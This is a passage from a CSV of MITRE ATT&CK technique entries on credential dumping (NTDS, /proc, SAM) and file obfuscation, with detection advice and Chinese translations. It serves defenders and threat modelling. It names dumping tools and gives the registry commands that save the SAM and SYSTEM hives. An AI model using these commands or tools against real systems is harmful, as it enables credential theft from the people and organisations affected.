T1003.003,OS Credential Dumping: NTDS,"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)

In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)

The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy
",https://attack.mitre.org/techniques/T1003/003,11 February 2020,08 March 2022,1.1,Credential Access,"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.",Windows,"Command: Command Execution, File: File Access",True,T1003,,"Ed Williams, Trustwave, SpiderLabs",Administrator,,Access to Domain Controller or backup,,,,"(Citation: FireEye FIN6 Apr 2019),(Citation: Cycraft Chimera April 2020),(Citation: Symantec Cicada November 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Microsoft NICKEL December 2021),(Citation: CME Github September 2018),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Impacket Tools),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Cary Esentutl),(Citation: Volexity Exchange Marauder March 2021),(Citation: Github Koadic),(Citation: Core Security Impacket),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: NCC Group Chimera January 2021),(Citation: FireEye FIN6 April 2016),(Citation: LOLBAS Esentutl),(Citation: US-CERT TA18-074A),(Citation: Metcalf 2015)",操作系统凭证转储：NTDS,攻击者可能会尝试访问或创建 Active Directory 域数据库的副本以窃取凭据信息，以及获取有关域成员的其他信息，例如设备、用户和访问权限。默认情况下，NTDS 文件 (NTDS.dit) 位于域控制器的 <code>%SystemRoot%\NTDS\Ntds.dit</code> 中。(Citation: Wikipedia Active Directory) 除了在活动域控制器，攻击者可能会搜索包含相同或相似信息的备份。（引用：Metcalf 2015）以下工具和技术可用于枚举 NTDS 文件和整个 Active Directory 哈希的内容。 * 卷影复制 * secretsdump.py * 使用内置的 Windows 工具 ntdsutil.exe * Invoke-NinjaCopy
T1003.007,OS Credential Dumping: Proc Filesystem,"Adversaries may gather credentials from information stored in the Proc filesystem or <code>/proc</code>. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.

This functionality has been implemented in the MimiPenguin(Citation: MimiPenguin GitHub May 2017), an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.",https://attack.mitre.org/techniques/T1003/007,11 February 2020,19 March 2020,1.0,Credential Access,"To obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path <code>/proc/\*/maps</code>, where the <code>\*</code> directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.",Linux,"Command: Command Execution, File: File Access",True,T1003,,,root,,,,,,"(Citation: MimiPenguin GitHub May 2017),(Citation: GitHub LaZagne Dec 2018),",操作系统凭证转储：Proc 文件系统,攻击者可能会从存储在 Proc 文件系统或 <code>/proc</code> 中的信息中收集凭据。 Linux 上的 Proc 文件系统包含大量有关正在运行的操作系统状态的信息。以 root 权限运行的进程可以使用此工具来抓取其他正在运行的程序的实时内存。如果这些程序中的任何一个将密码以明文形式或密码哈希存储在内存中，则可以分别获取这些值以用于使用或暴力攻击。此功能已在受 Mimikatz 启发的开源工具 MimiPenguin（引用：MimiPenguin GitHub 2017 年 5 月）中实现。该工具转储进程内存，然后通过查找文本字符串和正则表达式模式来获取密码和哈希，以了解给定应用程序（如 Gnome Keyring、sshd 和 Apache）如何使用内存来存储此类身份验证工件。
T1003.002,OS Credential Dumping: Security Account Manager,"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.

A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with Reg:

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)

Notes: 

* RID 500 account is the local, built-in administrator.
* RID 501 is the guest account.
* User accounts start with a RID of 1,000+.
",https://attack.mitre.org/techniques/T1003/002,11 February 2020,15 June 2022,1.0,Credential Access,Hash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.,Windows,"Command: Command Execution, File: File Access, Windows Registry: Windows Registry Key Access",True,T1003,,"Ed Williams, Trustwave, SpiderLabs",,,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Deply Mimikatz),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Mandiant APT1),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: CME Github September 2018),(Citation: Impacket Tools),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: McAfee Night Dragon),(Citation: Wikipedia pwdump),(Citation: TrueSec Gsecdump),(Citation: Symantec Backdoor.Mivast),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: CrowdStrike IceApple May 2022),(Citation: Cybereason Soft Cell June 2019),(Citation: Github AD-Pentest-Script),(Citation: Dell TG-3390),(Citation: cobaltstrike manual),(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015),(Citation: Github Koadic),(Citation: FireEye APT33 Guardrail),(Citation: F-Secure CozyDuke),(Citation: NCC Group APT15 Alive and Strong),(Citation: US-CERT TA18-074A),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: GitHub Mimikatz lsadump Module),(Citation: F-Secure The Dukes),(Citation: NCSC Joint Report Public Tools),(Citation: Microsoft Disable NTLM Nov 2012)",操作系统凭据转储：安全帐户管理器,"攻击者可能会尝试通过内存技术或通过存储 SAM 数据库的 Windows 注册表从安全帐户管理器 (SAM) 数据库中提取凭证材料。 SAM 是一个数据库文件，其中包含主机的本地帐户，通常是使用 <code>net user</code> 命令找到的那些。枚举 SAM 数据库需要 SYSTEM 级别的访问权限。许多工具可用于通过内存技术检索 SAM 文件： * pwdumpx.exe * [gsecdump](https://attack.mitre.org/software/S0008) * [Mimikatz](https:// attack.mitre.org/software/S0002) * secretsdump.py 或者，可以使用 Reg 从注册表中提取 SAM： * <code>reg save HKLM\sam sam</code> * <code>reg save HKLM\system system</code> Creddump7 可用于在本地处理 SAM 数据库以检索哈希值。（引用：GitHub Creddump7） 注意：* RID 500 帐户是本地内置管理员。 * RID 501 是访客帐户。 * 用户帐户以 1,000+ 的 RID 开始。"
T1027,Obfuscated Files or Information,"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. 

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. 

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",https://attack.mitre.org/techniques/T1027,31 May 2017,30 September 2022,1.3,Defense Evasion,"Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). 

Flag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''""'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) 

Obfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. 

The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ","Linux, Windows, macOS","Command: Command Execution, File: File Creation, File: File Metadata, Module: Module Load, Process: OS API Execution, Process: Process Creation",False,,"Application Control, Host Forensic Analysis, Host Intrusion Prevention Systems, Log Analysis, Signature-based Detection","Christiaan Beek, @ChristiaanBeek; Red Canary",,,,CAPEC-267,,,"(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: CopyKittens Nov 2015),(Citation: ESET Gamaredon June 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET RTM Feb 2017),(Citation: FireEye Ransomware Feb 2020),(Citation: ESET LoudMiner June 2019),(Citation: TrendMicro MacOS April 2018),(Citation: Symantec Remsec IOCs),(Citation: GitHub Sliver C2),(Citation: ESET Operation Groundbait),(Citation: Bitdefender StrongPity June 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Cylance Machete Mar 2017),(Citation: Securelist Darkhotel Aug 2015),(Citation: Unit42 Emissary Panda May 2019),(Citation: Cybereason Bazar July 2020),(Citation: FireEye APT33 Guardrail),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Deep Instinct TA505 Apr 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Rewterz Sidewinder APT April 2020),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FireEye APT34 Dec 2017),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Proofpoint TA505 Jan 2019),(Citation: Unit 42 OilRig Sept 2018),(Citation: ESET Sednit USBStealer 2014),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Threatpost Hancitor),(Citation: McAfee Sharpshooter December 2018),(Citation: Unit 42 Valak July 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: McAfee Maze March 2020),(Citation: Cybereason Oceanlotus May 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: Donut Github),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Anomali Rocke March 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: F-Secure CozyDuke),(Citation: BlackBerry Amadey 2020),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: FireEye FIN7 Aug 2018),(Citation: Cylance Dust Storm),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: McAfee Lazarus Jul 2020),(Citation: Morphisec ShellTea June 2019),(Citation: Crowdstrike Indrik November 2018),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Securelist Remexi Jan 2019),(Citation: Lazarus APT January 2022),(Citation: Symantec Gallmaker Oct 2018),(Citation: Securelist MuddyWater Oct 2018),(Citation: Trend Micro njRAT 2018),(Citation: Unit 42 Gamaredon February 2022),(Citation: Proofpoint TA505 Sep 2017),(Citation: Kaspersky MoleRATs April 2019),(Citation: Novetta Blockbuster Loaders),(Citation: Trend Micro Emotet Jan 2019),(Citation: MacKeeper Bundlore Apr 2019),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Securelist APT10 March 2021),(Citation: FireEye Hancitor),(Citation: CISA Supernova Jan 2021),(Citation: Visa FIN6 Feb 2019),(Citation: Kaspersky StoneDrill 2017),(Citation: Cylance Shell Crew Feb 2017),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Fortinet Diavol July 2021),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Picus Emotet Dec 2018),(Citation: ESET OceanLotus macOS April 2019),(Citation: NCC Group WastedLocker June 2020),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: ESET Machete July 2019),(Citation: Accenture Lyceum Targets November 2021),(Citation: Kaspersky Lab SynAck May 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: Malwarebytes SmokeLoader 2016),(Citation: Dell TG-3390),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Bitdefender Naikon April 2021),(Citation: Trustwave GoldenSpy2 June 2020),(Citation: PaloAlto DNS Requests May 2016),(Citation: Talos SamSam Jan 2018),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Juniper IcedID June 2020),(Citation: Trend Micro Conficker),(Citation: Carbon Black HotCroissant April 2020),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: CISA SoreFang July 2016),(Citation: Symantec Security Center Trojan.Kwampirs),(Citation: FireEye APT32 May 2017),(Citation: Intezer HiddenWasp Map 2019),(Citation: Symantec Cicada November 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Kaspersky Sofacy),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: ESET Hermetic Wizard March 2022),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Symantec RAINDROP January 2021),(Citation: Arxiv Avaddon Feb 2021),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Proofpoint TA416 November 2020),(Citation: ESET Operation Spalax Jan 2021),(Citation: Dell Sakula),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Intel 471 REvil March 2020),(Citation: Kaspersky TajMahal April 2019),(Citation: ESET ForSSHe December 2018),(Citation: Fortinet Agent Tesla April 2018),(Citation: Prevailion DarkWatchman 2021),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: NCC Group Fivehands June 2021),(Citation: Unit 42 NOKKI Sept 2018),(Citation: ThreatConnect Kimsuky September 2020),(Citation: Unit 42 CARROTBAT January 2020),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Zscaler Higaisa 2020),(Citation: ESET Ebury Feb 2014),(Citation: CheckPoint Naikon May 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Secureworks Karagany July 2019),(Citation: S2 Grupo TrickBot June 2017),(Citation: CISA EB Aug 2020),(Citation: McAfee Night Dragon),(Citation: Novetta Blockbuster RATs),(Citation: CERT-EE Gamaredon January 2021),(Citation: Malwarebytes Pony April 2016),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Talos Bisonal Mar 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: FireEye Periscope March 2018),(Citation: FireEye POSHSPY April 2017),(Citation: Proofpoint TA505 October 2019),(Citation: Novetta Winnti April 2015),(Citation: FireEye Clandestine Wolf),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Palo Alto Reaver Nov 2017),(Citation: PowerSploit Documentation),(Citation: Prevx Carberp March 2011),(Citation: Proofpoint Bumblebee April 2022),(Citation: Proofpoint ZeroT Feb 2017),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Malwarebytes Konni Aug 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Emissary Trojan Feb 2016),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Cycraft Chimera April 2020),(Citation: Secureworks REvil September 2019),(Citation: Talos Group123),(Citation: DFIR Ryuk's Return October 2020),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ATT Sidewinder January 2021),(Citation: Securelist LuckyMouse June 2018),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: Kaspersky Turla),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: CrowdStrike IceApple May 2022),(Citation: Cybereason Soft Cell June 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: FOX-IT May 2016 Mofang),(Citation: ESET EvilNum July 2020),(Citation: ESET Dukes October 2019),(Citation: Trend Micro Skidmap),(Citation: SentinelOne Valak June 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: objective-see windtail2 jan 2019),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: ESET Kobalos Feb 2021),(Citation: Check Point Sunburst Teardrop December 2020),(Citation: Palo Alto Shamoon Nov 2016),(Citation: DustySky),(Citation: MSTIC FoggyWeb September 2021),(Citation: Qualys LolZarus),(Citation: CrowdStrike Putter Panda),(Citation: iSight Sandworm Oct 2014),(Citation: objsee mac malware 2017),(Citation: Group IB Ransomware May 2020),(Citation: Cybereason Astaroth Feb 2019),(Citation: Aqua TeamTNT August 2020),(Citation: Securelist ScarCruft May 2019),(Citation: Novetta-Axiom),(Citation: Mandiant APT1 Appendix),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: Citizen Lab Group5),(Citation: Unit42 OilRig Nov 2018),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ANSSI Sandworm January 2021),(Citation: Symantec Ukraine Wipers February 2022),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Talos Smoke Loader July 2018),(Citation: FireEye Fin8 May 2016),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Trend Micro Waterbear December 2019),(Citation: McAfee Sodinokibi October 2019),(Citation: FoxIT Wocao December 2019),(Citation: Lotus Blossom Dec 2015),(Citation: ESET Sednit Part 1),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Symantec Whitefly March 2019),(Citation: ESET Sednit Part 2),(Citation: GitHub PowerSploit May 2012),(Citation: Talos Promethium June 2020),(Citation: Symantec Elderwood Sept 2012),(Citation: OilRig New Delivery Oct 2017),(Citation: TrendMicro Netwalker May 2020),(Citation: Talos Micropsia June 2017),(Citation: Symantec Shuckworm January 2022),(Citation: Trend Micro DRBControl February 2020),(Citation: ASERT InnaputRAT April 2018),(Citation: Unit42 BendyBear Feb 2021),(Citation: ESET LightNeuron May 2019),(Citation: Cisco H1N1 Part 1),(Citation: Talos Seduploader Oct 2017),(Citation: ProofPoint Ursnif Aug 2016),(Citation: Trustwave Pillowmint June 2020),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: SecureWorks August 2019),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: McAfee Cuba April 2021),(Citation: Talos Remcos Aug 2018),(Citation: Unit42 Redaman January 2019),(Citation: Fidelis INOCNATION),(Citation: Cisco Ukraine Wipers January 2022),(Citation: ESET PipeMon May 2020),(Citation: Palo Alto OilRig May 2016),(Citation: ESET Industroyer),(Citation: FireEye APT19),(Citation: Symantec Frutas Feb 2013),(Citation: Securelist BlackOasis Oct 2017),(Citation: Bromium Ursnif Mar 2017),(Citation: Recorded Future REDDELTA July 2020),(Citation: FireEye CARBANAK June 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: ESET Carbon Mar 2017),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: Flashpoint FIN 7 March 2019),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Symantec Darkmoon Aug 2005),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Checkpoint IndigoZebra July 2021),(Citation: CISA ComRAT Oct 2020),(Citation: fsecure NanHaiShu July 2016),(Citation: Malwarebytes Higaisa 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Microsoft NICKEL December 2021),(Citation: ESET Emotet Dec 2018),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Lotus Blossom Jun 2015),(Citation: Infoblox Lokibot January 2019),(Citation: FireEye NETWIRE March 2019),(Citation: ESET ComRAT May 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: Talos Zeus Panda Nov 2017),(Citation: Group IB GrimAgent July 2021),(Citation: ESET Telebots Dec 2016),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye APT41 March 2020),(Citation: Symantec Leafminer July 2018),(Citation: Cybereason TA505 April 2019),(Citation: Fysbis Dr Web Analysis),(Citation: Talos PoetRAT April 2020),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: ESET Gelsemium June 2021),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: jRAT Symantec Aug 2018),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Talos Frankenstein June 2019),(Citation: Cybereason Bumblebee August 2022),(Citation: CarbonBlack Conti July 2020),(Citation: Talos MuddyWater Jan 2022),(Citation: FireEye FiveHands April 2021),(Citation: FireEye FELIXROOT July 2018),(Citation: Sophos Netwalker May 2020),(Citation: Unit 42 Hildegard Malware),(Citation: ClearSky MuddyWater Nov 2018),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Talos PoetRAT October 2020),(Citation: ESET Attor Oct 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Cyberreason Anchor December 2019),(Citation: FireEye Obfuscation June 2017),(Citation: Cybereason Valak May 2020),(Citation: TrendMicro TropicTrooper 2015),(Citation: ESET Turla PowerShell May 2019),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Checkpoint Dridex Jan 2021),(Citation: Trend Micro Tick November 2019),(Citation: FinFisher Citation),(Citation: ESET OceanLotus Mar 2019),(Citation: F-Secure Sofacy 2015),(Citation: Microsoft DUBNIUM July 2016),(Citation: Trend Micro Iron Tiger April 2021),(Citation: CoinTicker 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Palo Alto Comnie),(Citation: Novetta Blockbuster),(Citation: Palo Alto DNS Requests),(Citation: Medium Metamorfo Apr 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Accenture HyperStack October 2020),(Citation: Qualys Hermetic Wiper March 2022),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Forcepoint Monsoon),(Citation: DFIR Conti Bazar Nov 2021),(Citation: ClearSky MuddyWater June 2019),(Citation: Github PowerShell Empire),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: Unit 42 BackConfig May 2020),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Unit 42 Playbook Dec 2017),(Citation: FBI FLASH APT39 September 2020),(Citation: ESET TeleBots Oct 2018),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: FireEye APT28),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Trend Micro KillDisk 1),(Citation: Radware Micropsia July 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: NSA/FBI Drovorub August 2020),(Citation: GitHub Invoke-Obfuscation),(Citation: G Data Sodinokibi June 2019),(Citation: Cyble Sidewinder September 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: Eset Ramsay May 2020),(Citation: Microsoft Actinium February 2022),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Unit 42 Bisonal July 2018),(Citation: Securelist ShadowPad Aug 2017),(Citation: Talos MuddyWater May 2019),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Picus Sodinokibi January 2020),(Citation: NCC Group Team9 June 2020),(Citation: Trend Micro Daserf Nov 2017),(Citation: Symantec Buckeye),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Talos GravityRAT),(Citation: ESET OceanLotus),(Citation: Talos Kimsuky Nov 2021),(Citation: FireEye APT29 Nov 2018),(Citation: Talos Emotet Jan 2019),(Citation: Unit 42 Nokki Oct 2018),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Securelist Denis April 2017),(Citation: Trend Micro TeamTNT),(Citation: Leonardo Turla Penquin May 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: Chronicle Winnti for Linux May 2019),(Citation: TrendMicro EarthLusca 2022),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Cybereason Conti Jan 2021),(Citation: Bitdefender FIN8 July 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: FireEye FIN7 Oct 2019),(Citation: Talos Cobalt Group July 2018),(Citation: FireEye APT10 Sept 2018),(Citation: Unit 42 KerrDown February 2019),(Citation: ClearSky Lazarus Aug 2020),(Citation: Accenture Hogfish April 2018),(Citation: Trend Micro Muddy Water March 2021),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Securelist WhiteBear Aug 2017),(Citation: Secureworks MCMD July 2019),(Citation: Palo Alto Sofacy 06-2018),(Citation: Sophos SamSam Apr 2018),(Citation: Medium S2W WhisperGate January 2022),(Citation: ESET GreyEnergy Oct 2018),(Citation: Cyberint Qakbot May 2021),(Citation: BlackBerry Bahamut),(Citation: Microsoft FinFisher March 2018),(Citation: Microsoft AMSI June 2015),(Citation: win10_asr)",混淆文件或信息,攻击者可能试图通过加密、编码或以其他方式混淆系统或传输中的内容来使可执行文件或文件难以被发现或分析。这是可以跨不同平台和网络用来规避防御的常见行为。有效负载可能会被压缩、存档或加密以避免检测。这些有效负载可以在初始访问期间或以后使用以减轻检测。有时可能需要用户的操作来打开和 [去混淆/解码文件或信息](https://attack.mitre.org/techniques/T1140) 以进行 [用户执行](https://attack.mitre.org/techniques /T1204）。用户还可能需要输入密码才能打开对手提供的受密码保护的压缩/加密文件。 （引文：Volexity PowerDuke 2016 年 11 月）攻击者也可能使用压缩或存档的脚本，例如 JavaScript。部分文件也可以被编码以隐藏纯文本字符串，否则这些字符串会帮助防御者进行发现。 （引用：Linux/Cdorked.A We Live Security Analysis）有效负载也可能被拆分为单独的、看似良性的文件，只有在重新组装时才会显示恶意功能。 （引文：Carbon Black Obfuscation September 2016）攻击者还可能混淆从有效负载或直接通过 [命令和脚本解释器] (https://attack.mitre.org/techniques/T1059) 执行的命令。环境变量、别名、字符和其他平台/语言特定语义可用于规避基于签名的检测和应用程序控制机制。 （引文：FireEye 混淆 2017 年 6 月）（引文：FireEye Revoke-Obfuscation 2017 年 7 月）（引文：PaloAlto EncodedCommand 2017 年 3 月）
T1027.001,Obfuscated Files or Information: Binary Padding,"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. 

Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) ",https://attack.mitre.org/techniques/T1027/001,05 February 2020,15 October 2021,1.2,Defense Evasion,"Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. ","Linux, Windows, macOS",File: File Metadata,True,T1027,"Anti-virus, Signature-based detection","Martin Jirkal, ESET",,,,"CAPEC-572, CAPEC-655",,,"(Citation: ESET Gelsemium June 